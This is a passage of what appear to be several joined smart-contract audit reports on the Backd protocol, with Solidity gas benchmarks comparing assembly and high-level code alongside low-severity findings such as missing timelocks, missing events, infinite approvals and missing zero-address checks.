┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 37287              ┆ 217             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ divAssemblyTest    ┆ 265             ┆ 265 ┆ 265    ┆ 265 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯  ```  ### Lines  - AmmGauge.sol:111  - AmmGauge.sol:133  - AmmGauge.sol:148  - BkdLocker.sol:140  - BkdLocker.sol:326  - CvxMintAmount.sol:10  - CvxMintAmount.sol:12  - CvxMintAmount.sol:21  - CvxMintAmount.sol:30  - CvxMintAmount.sol:33  - InflationManager.sol:574  - InflationManager.sol:588  - InflationManager.sol:601  - KeeperGauge.sol:114  - LpGauge.sol:115  - Minter.sol:188  - Minter.sol:190  - Minter.sol:200  - Minter.sol:204  - Minter.sol:207  - Minter.sol:219  - Minter.sol:86  - Minter.sol:87  - Minter.sol:88  - Minter.sol:90  - VestedEscrow.sol:104  - VestedEscrow.sol:108  - VestedEscrow.sol:109  - VestedEscrow.sol:155  - VestedEscrow.sol:63  - VestedEscrowRevocable.sol:59  ---  ## Use assembly when getting a contract's balance of ETH.  You can use `selfbalance()` instead of `address(this).balance` when getting your contract's balance of ETH to save gas. Additionally, you can use `balance(address)` instead of `address.balance()` when getting an external contract's balance of ETH.  ```js  contract GasTest is DSTest {     Contract0 c0;     Contract1 c1;     Contract2 c2;     Contract3 c3;      function setUp() public {         c0 = new Contract0();         c1 = new Contract1();         c2 = new Contract2();         c3 = new Contract3();     }      function testGas() public {         c0.addressInternalBalance();         c1.assemblyInternalBalance();         c2.addressExternalBalance(address(this));         c3.assemblyExternalBalance(address(this));     } }  contract Contract0 {     function addressInternalBalance() public returns (uint256) {         return address(this).balance;     } }  contract Contract1 {     function assemblyInternalBalance() public returns (uint256) {         assembly {             let c := selfbalance()             mstore(0x00, c)             return(0x00, 0x20)         }     } }  contract Contract2 {     function addressExternalBalance(address addr) public {         uint256 bal = address(addr).balance;         bal++;     } }  contract Contract3 {     function assemblyExternalBalance(address addr) public {         uint256 bal;         assembly {             bal := balance(addr)         }         bal++;     } } ```  ### Gas Report  ```js ╭────────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract0 contract     ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost        ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 23675                  ┆ 147             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name          ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ addressInternalBalance ┆ 148             ┆ 148 ┆ 148    ┆ 148 ┆ 1       │ ╰────────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ╭─────────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract1 contract      ┆                 ┆     ┆        ┆     ┆         │ ╞═════════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost         ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 27081                   ┆ 165             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name           ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ assemblyInternalBalance ┆ 133             ┆ 133 ┆ 133    ┆ 133 ┆ 1       │ ╰─────────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ╭────────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract2 contract     ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost        ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 61511                  ┆ 339             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name          ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ addressExternalBalance ┆ 417             ┆ 417 ┆ 417    ┆ 417 ┆ 1       │ ╰────────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ╭─────────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract3 contract      ┆                 ┆     ┆        ┆     ┆         │ ╞═════════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost         ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 57105                   ┆ 317             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name           ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ assemblyExternalBalance ┆ 411             ┆ 411 ┆ 411    ┆ 411 ┆ 1       │ ╰─────────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯  ```  ### Lines  - FeeBurner.sol:102  - RewardHandler.sol:40  ---  ## Use assembly to check for address(0)  ```js   contract GasTest is DSTest {     Contract0 c0;     Contract1 c1;      function setUp() public {         c0 = new Contract0();         c1 = new Contract1();     }      function testGas() public view {         c0.ownerNotZero(address(this));         c1.assemblyOwnerNotZero(address(this));     } }  contract Contract0 {     function ownerNotZero(address _addr) public pure {         require(_addr != address(0), "zero address)");     } }  contract Contract1 {     function assemblyOwnerNotZero(address _addr) public pure {         assembly {             if iszero(_addr) {                 mstore(0x00, "zero address")                 revert(0x00, 0x20)             }         }     } }   ```  ### Gas Report  ```js ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract0 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 61311              ┆ 338             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ ownerNotZero       ┆ 258             ┆ 258 ┆ 258    ┆ 258 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ╭──────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract1 contract   ┆                 ┆     ┆        ┆     ┆         │ ╞══════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost      ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 44893                ┆ 255             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name        ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ assemblyOwnerNotZero ┆ 252             ┆ 252 ┆ 252    ┆ 252 ┆ 1       │ ╰──────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ```  ### Lines  - AddressProvider.sol:102  - AddressProvider.sol:105  - AddressProvider.sol:122  - AddressProvider.sol:163  - AddressProvider.sol:166  - AddressProvider.sol:295  - AddressProvider.sol:98  - Controller.sol:34  - Controller.sol:35  - Controller.sol:48  - Controller.sol:50  - Controller.sol:68  - Controller.sol:82  - FeeBurner.sol:101  - FeeBurner.sol:60  - InflationManager.sol:244  - InflationManager.sol:270  - InflationManager.sol:295  - InflationManager.sol:486  - InflationManager.sol:496  - InflationManager.sol:508  - InflationManager.sol:522  - InflationManager.sol:59  - InflationManager.sol:60  - InflationManager.sol:622  - LpGauge.sol:31  - LpGauge.sol:35  - Minter.sol:100  - PoolMigrationZap.sol:26  - PoolMigrationZap.sol:62  - Preparable.sol:100  - Preparable.sol:142  - RewardHandler.sol:45  - StakerVault.sol:119  - StakerVault.sol:160  - StakerVault.sol:205  - StakerVault.sol:226  - StakerVault.sol:238  - StakerVault.sol:326  - StakerVault.sol:372  - StakerVault.sol:66  - StakerVault.sol:76  - VestedEscrow.sol:69  - VestedEscrow.sol:75  - VestedEscrow.sol:98  ---
## Missing Equivalence Checks in Setters **Severity**: Low **Context**: [`VestedEscrow.sol#L64-L72`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L64-L72), [`VestedEscrow.sol#L74-L78`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L74-L78)  **Description**: Setter functions are missing checks to validate if the new value being set is the same as the current value already set in the contract. Such checks will showcase mismatches between on-chain and off-chain states.  **Recommendation**: Add in the additional checks to validate if the new value being set is the same as the current value already set in the contract.   ## Missing Time locks **Severity**: Low **Context**: [`Controller.sol#L62-L76`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/Controller.sol#L62-L76)  **Description**: None of the onlyOwner functions that change critical protocol addresses/parameters appear to have a time lock for a time-delayed change to alert: (1) users and give them a chance to engage/exit protocol if they are not agreeable to the changes (2) team in case of compromised owner(s) and given them a chance to perform incident response.  **Recommendation**: Add a time lock to these functions for a time-delayed change to alert users and protect against possiable malicious changes by compromised owners(s).   ## Lack of Event Emission For Critical Functions **Severity**: Low **Context**: [`Controller.sol#L33-L37`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/Controller.sol#L33-L37), [`StakerVault.sol#L98-L102`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/StakerVault.sol#L98-L102), [`StakerVault.sol#L197-L210`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/StakerVault.sol#L197-L210), [`StakerVault.sol#L218-L235`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/StakerVault.sol#L218-L235), [`AmmGauge.sol#L49-L54`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol#L49-L54), [`InflationManager.sol#L58-L63`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L58-L63), [`InflationManager.sol#L435-L438`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L435-L438), [`InflationManager.sol#L446-L467`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L446-L467), [`InflationManager.sol#L482-L489`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L482-L489), [`KeeperGauge.sol#L57-L62`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/KeeperGauge.sol#L57-L62), [`Minter.sol#L99-L102`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/Minter.sol#L99-L102), [`Minter.sol#L104-L108`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/Minter.sol#L104-L108), [`VestedEscrow.sol#L64-L72`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L64-L72), [`VestedEscrow.sol#L74-L78`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L74-L78)  **Description**: Several functions update critical parameters that are missing event emission. These should be performed to ensure tracking of changes of such critical parameters.  **Recommendation**: Add events to functions that change critical parameters.   ## Max/Infinite Approvals are Dangerous **Severity**: Low **Context**: [`RewardHandler.sol#L62-L65`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/RewardHandler.sol#L62-L65)  **Description**: Giving max/infinite approvals to contracts are dangerous. Giving max/infinite approvals to contracts are dangerous because if those contracts are exploited then they can remove all the funds from the approving addresses.  Recommendation Check allowance and approve as much as required.   ## TODOs Left In The Code **Severity**: Informational **Context**: [`InflationManager.sol#L532`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L532)  **Description**: There should never be any TODOs in the code when deploying.  **Recommendation**: Finish the TODOs before deploying.   ## Spelling Errors **Severity**: Informational **Context**: [`BkdLocker.sol#L173 (invlude => include)`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#L173), [`FeeBurner.sol#L29 (successfull => successful)`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/FeeBurner.sol#L29), [`FeeBurner.sol#L29 (Emmited => Emitted)`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/FeeBurner.sol#L29), [`FeeBurner.sol#L35 (Recieve => Receive)`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/FeeBurner.sol#L35), [`FeeBurner.sol#L84 (Transfering => Transferring)`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/FeeBurner.sol#L84)  **Description**: Spelling errors in comments can cause confusion to both users and developers.  **Recommendation**: Check all misspellings to ensure they are corrected.   ## Missing or Incomplete NatSpec **Severity**: Informational **Context**: [`All Contracts`](https://github.com/code-423n4/2022-05-backd)  **Description**: Some functions are missing @notice/@dev NatSpec comments for the function, @param for all/some of their parameters and @return for return values. Given that NatSpec is an important part of code documentation, this affects code comprehension, auditability and usability.  **Recommendation**: Add in full NatSpec comments for all functions to have complete code documentation for future use.
## Catching The Array Length Prior To Loop **Context**: [`RoleManager.sol#L75-L88`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/access/RoleManager.sol#L75-L88), [`RewardHandler.sol#L35-L55`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/RewardHandler.sol#L35-L55), [`StakerVault.sol#L256-L263`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/StakerVault.sol#L256-L263), [`FeeBurner.sol#L43-L88`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/FeeBurner.sol#L43-L88), [`InflationManager.sol#L110-L125 (For L116)`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L110-L125), [`VestedEscrow.sol#L89-L111`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L89-L111), [`PoolMigrationZap.sol#L20-L29`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/zaps/PoolMigrationZap.sol#L20-L29), [`PoolMigrationZap.sol#L38-L45`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/zaps/PoolMigrationZap.sol#L38-L45)  **Description**: One can save gas by caching the array length (in stack) and using that set variable in the loop. Replace state variable reads and writes within loops with local variable reads and writes. This is done by assigning state variable values to new local variables, reading and/or writing the local variables in a loop, then after the loop assigning any changed local variables to their equivalent state variables.  **Recommendation**:  Simply do something like so before the for loop: ```uint length =  variable.length```. Then add ```length``` in place of ``` variable.length``` in the for loop.    ## In `require()`, Use `!= 0` Instead of `> 0` With Uint Values **Context**: [`BkdLocker.sol#L90-L100 (For both)`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#L90-L100), [`BkdLocker.sol#L133-L155 (For L137)`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#L133-L155), [`AmmGauge.sol#L103-L116 (For L104)`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol#L103-L116), [`AmmGauge.sol#L124-L138 (For L125)`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol#L124-L138), [`KeeperGauge.sol#L125-L144 (For L140)`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/KeeperGauge.sol#L125-L144), [`VestedEscrow.sol#L80-L87 (For L84)`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L80-L87)  **Description**: In a require, when checking a uint, using `!= 0` instead of `> 0` saves 6 gas. This will jump over or avoid an extra `ISZERO` opcode.  **Recommendation**:  Use `!= 0` instead of `> 0` with uint values but only in `require()` statements.   ## Setting The Constructor To Payable **Context**: [`All Contracts`](https://github.com/code-423n4/2022-05-backd)  **Description**: You can cut out 10 opcodes in the creation-time EVM bytecode if you declare a constructor payable. Making the constructor payable eliminates the need for an initial check of `msg.value == 0` and saves 21 gas on deployment with no security risks.  **Recommendation**:  Set the constructor to payable.   ## Function Ordering via Method ID **Context**: [`All Contracts`](https://github.com/code-423n4/2022-05-backd)  **Description**: Contracts most called functions could simply save gas by function ordering via Method ID. Calling a function at runtime will be cheaper if the function is positioned earlier in the order (has a relatively lower Method ID) because 22 gas are added to the cost of a function for every position that came before it. The caller can save on gas if you prioritize most called functions. One could use [`This tool`](https://emn178.github.io/solidity-optimize-name/) to help find alternative function names with lower Method IDs while keeping the original name intact.  **Recommendation**:  Find a lower method ID name for the most called functions for example ```mostCalled()``` vs. ```mostCalled_41q()``` is cheaper by 44 gas.
### Redundant checks can be removed  **Details**: The checks on [L575](https://github.com/code-423n4/2022-05-backd/blob/1136e0cdc8579614a33832fe2a21785d60aac19b/protocol/contracts/tokenomics/InflationManager.sol#L575), [L589](https://github.com/code-423n4/2022-05-backd/blob/1136e0cdc8579614a33832fe2a21785d60aac19b/protocol/contracts/tokenomics/InflationManager.sol#L589) and [L602](https://github.com/code-423n4/2022-05-backd/blob/1136e0cdc8579614a33832fe2a21785d60aac19b/protocol/contracts/tokenomics/InflationManager.sol#L602) of CrvDepositor.sol can be removed since the variables `totalKeeperPoolWeight`, `totalLpPoolWeight` and `totalAmmTokenWeight` are `uint256` and the unchecked versions of add and sub are not used before these lines.   ### Some if conditions can be simplified changing ≤ to ==  **Details**: Some variables in the contract are of the type `uint256` and will never be strictly negative. Thus, to check if these variables are not strictly positive you only need to check if they are equal to 0 — this will economize gas because EVM instruction set does not have an opcode for the condition "less than or eq", only for "less than" and "equal" opcodes.   In view of this it is suggested to perform the following simplifications:  - Since `amount` in [L62](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L62) of AmmGauge.sol is `uint256`, the if condition at [L63](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L63) can be simplified to          ```solidity     if (amount == 0) return 0;     ```      - Since the variables `amount`, `crvAmount` and `crxAmount` in [L70-72](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmConvexGauge.sol#L70-L72) of AmmConvexGauge.sol are `uint256`, the if condition at [L73](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmConvexGauge.sol#L73) can be simplified to          ```solidity     if (amount == 0 && crvAmount == 0 && cvxAmount == 0) return 0;     ```      - Since the variable `amount` in [L58](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/LpGauge.sol#L58) of LpGauge.sol is `uint256`, the if condition at [L59](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/LpGauge.sol#L59) can be simplified to          ```solidity     if (amount == 0) return 0;     ```       ### Pre-incrementing a variable is cheaper than post-incrementing it  **Details**: Consider changing [L59](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L59) and [L98](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L98) of KeeperGauge.sol to `++epoch;`. For more information, see [G012](https://github.com/byterocket/c4-common-issues/blob/main/0-Gas-Optimizations.md/#g012---use-prefix-increment-instead-of-postfix-increment-if-possible) of c4-common-issues.  ### Unused library  **Details**: `ScaledMath` is added to `uint256` in BkdToken.sol, but its functions are not used. Consider removing it.
# `Approve` not compatible with Tether (USDT) implementation  Some tokens do not implement the ERC20 standard properly but are still accepted by most code that accepts ERC20 tokens. For example Tether (USDT or CVX)'s `approve()` function will revert if the current approval is not zero, to protect against front-running changes of approvals.  ```javascript function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {       // To change the approve amount you first have to reduce the addresses`      //  allowance to zero by calling `approve(_spender, 0)` if it is not      //  already 0 to mitigate the race condition described here:      //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729      require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));       allowed[msg.sender][_spender] = _value;      Approval(msg.sender, _spender, _value);  } ```  The code as currently implemented does not handle these sorts of tokens properly, which would prevent USDT or CVX, from being used by this project.  If the method [allPools](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/zaps/PoolMigrationZap.sol#L21) return pools with duplicate underlyings, it will fault in the case of USDT or CVX, for example.  Affected source code:  - [PoolMigrationZap.sol#L27](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/zaps/PoolMigrationZap.sol#L27)  # Lack of checks  The following methods have a lack checks if the received argument is an address, it's good practice in order to reduce human error to check that the address specified in the constructor or initialize is different than `address(0)`.  Affected source code:  - [RoleManager.sol#L32](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/access/RoleManager.sol#L32) - [Authorization.sol#L10](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/access/Authorization.sol#L10) - [RoleManager.sol#L151](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/access/RoleManager.sol#L151) - [RoleManager.sol#L157](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/access/RoleManager.sol#L157) - [StakerVault.sol#L71](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/StakerVault.sol#L71) - [BkdLocker.sol#L49-L50](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/BkdLocker.sol#L49-L50) - [AddressProvider.sol#L50](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/AddressProvider.sol#L50) - [AddressProvider.sol#L56](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/AddressProvider.sol#L56) - [AddressProvider.sol#L65](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/AddressProvider.sol#L65) - [AddressProvider.sol#L70](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/AddressProvider.sol#L70) - [AddressProvider.sol#L81](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/AddressProvider.sol#L81) - [BkdToken.sol#L21](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/BkdToken.sol#L21) - [FeeBurner.sol#L32](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/FeeBurner.sol#L32) - [VestedEscrowRevocable.sol#L43](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/VestedEscrowRevocable.sol#L43) - [KeeperGauge.sol#L48](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/KeeperGauge.sol#L48) - [VestedEscrow.sol#L52](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/VestedEscrow.sol#L52) - 